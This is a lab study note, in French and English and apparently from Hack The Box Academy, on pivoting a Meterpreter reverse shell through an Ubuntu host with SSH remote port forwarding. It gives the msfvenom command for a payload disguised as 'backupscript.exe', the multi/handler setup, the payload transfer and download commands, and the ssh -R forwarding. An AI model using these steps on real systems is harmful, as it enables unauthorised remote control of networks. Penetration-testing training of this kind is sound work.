# Remote/Reverse Port Forwarding with SSH

***

![](https://academy.hackthebox.com/storage/modules/158/33.png)

<mark style="color:orange;">**Mais que se passe-t-il si nous essayons d'obtenir un reverse shell ?**</mark>

L’hôte Windows ne peut communiquer qu’avec son réseau local (172.16.5.0/23) et ne peut pas joindre directement l’hôte d’attaque (10.129.x.x). Pour contourner ce blocage, on utilise un **hôte pivot** — ici le serveur Ubuntu — qui peut accéder aux deux réseaux. Ainsi, le reverse shell Meterpreter de Windows est configuré pour se connecter d’abord à Ubuntu (172.16.5.129:8080), qui retransmet ensuite le trafic vers notre hôte d’attaque (port 8000), permettant une session Meterpreter complète malgré les restrictions réseau.

<mark style="color:green;">**Creating a Windows Payload with msfvenom**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
{% endcode %}

<mark style="color:green;">**Configuring & Starting the multi/handler**</mark>

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run
```

<mark style="color:green;">**Transferring Payload to Pivot Host**</mark>

```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

<mark style="color:green;">**Starting Python3 Webserver on Pivot Host**</mark>

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

<mark style="color:green;">**Downloading Payload on the Windows Target**</mark>

We can download this `backupscript.exe` on the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`.

{% code overflow="wrap" fullWidth="true" %}
```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
{% endcode %}

{% hint style="warning" %}
Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.
{% endhint %}

<mark style="color:green;">**Using SSH -R**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
{% endcode %}

If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

<mark style="color:green;">**Meterpreter Session Established**</mark>

{% code fullWidth="true" %}
```shell-session
C:\>
```
{% endcode %}

{% hint style="info" %}
Notre session Meterpreter devrait indiquer que la connexion entrante provient du **localhost** lui-même (127.0.0.1), car nous recevons la connexion via le socket SSH local, qui a créé une connexion sortante vers le serveur Ubuntu. La commande **netstat** peut montrer que la connexion entrante provient du service SSH.
{% endhint %}

![](https://academy.hackthebox.com/storage/modules/158/44.png)
